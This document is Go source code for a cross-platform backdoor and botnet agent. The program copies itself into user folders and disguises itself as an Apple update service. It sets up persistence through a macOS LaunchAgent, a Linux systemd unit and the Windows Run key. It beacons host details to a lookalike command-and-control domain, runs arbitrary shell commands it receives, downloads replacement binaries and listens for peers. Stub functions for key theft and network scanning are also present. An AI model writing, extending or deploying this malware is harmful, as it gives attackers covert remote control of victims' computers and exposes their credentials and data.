package main

import (
	"bytes"
	"crypto/tls"
	"encoding/json"
	"io"
	"net"
	"net/http"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"runtime"
	"time"
)

const (
	c2URL        = "https://cdn‑gstatic[.]com/api"
	peerPort     = "40444"
	pollInterval = 90 * time.Second
	label        = "com.apple.updates"
)

type HostInfo struct {
	Hostname string   `json:"hn"`
	User     string   `json:"u"`
	OS       string   `json:"os"`
	Arch     string   `json:"arch"`
	Peers    []string `json:"peers,omitempty"`
}

func main() {
	bootstrap()                     // copy self & register persistence
	go startPeerListener()          // P2P
	go persist()                    
	for {
		info := collectInfo()
		if cmds := beacon(info); len(cmds) > 0 {
			for _, c := range cmds {
				go handle(c)
			}
		}
		time.Sleep(pollInterval)
	}
}

// Bootstrap
func bootstrap() {
	target := installSelf()
	if target != "" {
		exec.Command(target).Start()
		os.Exit(0)
	}
}
func installSelf() string {
	self, err := os.Executable()
	if err != nil {
		return ""
	}
	usr, _ := user.Current()
	var dst string

	switch runtime.GOOS {
	case "darwin":
		dir := filepath.Join(usr.HomeDir, "Library", "Application Support", label)
		os.MkdirAll(dir, 0755)
		dst = filepath.Join(dir, filepath.Base(self))
		copyFile(self, dst)
		//quarantine
		exec.Command("xattr", "-d", "com.apple.quarantine", dst).Run()
	case "linux":
		dir := filepath.Join(usr.HomeDir, ".local", "bin")
		os.MkdirAll(dir, 0755)
		dst = filepath.Join(dir, filepath.Base(self))
		copyFile(self, dst)
	case "windows":
		appdata := os.Getenv("APPDATA")
		dir := filepath.Join(appdata, label)
		os.MkdirAll(dir, 0755)
		dst = filepath.Join(dir, filepath.Base(self)+".exe")
		copyFile(self, dst)
	default:
		return ""
	}

	if dst != "" && dst != self {
		return dst
	}
	return ""
}

func copyFile(src, dst string) {
	in, err := os.Open(src)
	if err != nil {
		return
	}
	defer in.Close()
	out, err := os.Create(dst)
	if err != nil {
		return
	}
	defer out.Close()
	io.Copy(out, in)
	out.Chmod(0755)
}

// Persistence: macOS LaunchAgent, Linux systemd --user, Windows Run key
func persist() {
	usr, _ := user.Current()
	switch runtime.GOOS {
	case "darwin":
		plist := filepath.Join(usr.HomeDir, "Library", "LaunchAgents", label+".plist")
		os.MkdirAll(filepath.Dir(plist), 0755)
		os.WriteFile(plist, []byte(macPlist(usr.HomeDir)), 0644)
		exec.Command("launchctl", "load", "-w", plist).Run()
	case "linux":
		service := filepath.Join(usr.HomeDir, ".config", "systemd", "user", label+".service")
		os.MkdirAll(filepath.Dir(service), 0755)
		os.WriteFile(service, []byte(systemdUnit()), 0644)
		exec.Command("systemctl", "--user", "enable", label+".service").Run()
		exec.Command("systemctl", "--user", "start", label+".service").Run()
	case "windows":
		path, _ := os.Executable()
		cmd := exec.Command("reg", "add",
			`HKCU\Software\Microsoft\Windows\CurrentVersion\Run`,
			"/v", label, "/t", "REG_SZ", "/d", path, "/f")
		cmd.Run()
	}
}

func macPlist(home string) string {
	path, _ := os.Executable()
	return `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
  <key>Label</key><string>` + label + `</string>
  <key>ProgramArguments</key><array><string>` + path + `</string></array>
  <key>RunAtLoad</key><true/>
  <key>KeepAlive</key><true/>
</dict>
</plist>`
}

func systemdUnit() string {
	path, _ := os.Executable()
	return `[Unit]
Description=Agent ` + label + `

[Service]
ExecStart=` + path + `
Restart=always

[Install]
WantedBy=default.target`
}

func collectInfo() HostInfo {
	u, _ := user.Current()
	hn, _ := os.Hostname()
	return HostInfo{
		Hostname: hn,
		User:     u.Username,
		OS:       runtime.GOOS,
		Arch:     runtime.GOARCH,
		Peers:    listPeers(),
	}
}

// Beacon → C2
func beacon(info HostInfo) []string {
	j, _ := json.Marshal(info)
	req, _ := http.NewRequest("POST", c2URL, bytes.NewReader(j))
	req.Header.Set("Content-Type", "application/json")
	tr := &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}}
	resp, err := tr.RoundTrip(req)
	if err != nil || resp.StatusCode != 200 {
		return nil
	}
	defer resp.Body.Close()
	var cmds []string
	json.NewDecoder(resp.Body).Decode(&cmds)
	return cmds
}

// command
func handle(cmd string) {
	switch cmd {
	case "self-update":
		selfUpdate()
	case "exfil-keys":
		exfilKeys()
	case "scan-subnet":
		go activeScan()
	default:
		out, _ := exec.Command(shell(), "-c", cmd).CombinedOutput()
		sendResult(out)
	}
}

func shell() string {
	if runtime.GOOS == "windows" {
		return "cmd"
	}
	return "/bin/sh"
}

// P2P
func startPeerListener() {
	ln, _ := net.Listen("tcp", ":"+peerPort)
	for {
		conn, _ := ln.Accept()
		go func(c net.Conn) {
			defer c.Close()
			var peers []string
			json.NewDecoder(c).Decode(&peers)
			savePeers(peers)
		}(conn)
	}
}

//P2P peer cache
func listPeers() []string            { return nil }
func savePeers([]string)             {}

// Self-update
func selfUpdate() {
	tmp := filepath.Join(os.TempDir(), "agent.new")
	resp, err := http.Get(c2URL + "/agent-" + runtime.GOOS)
	if err != nil {
		return
	}
	defer resp.Body.Close()
	out, _ := os.Create(tmp)
	io.Copy(out, resp.Body)
	out.Chmod(0755)
	os.Rename(tmp, os.Args[0])
}

func activeScan()                 { /* zmap-like scan */ }
func exfilKeys()                  { /* сбор и отправка ключей */ }
func sendResult(data []byte)      { /* загрузка результата на C2 */ }
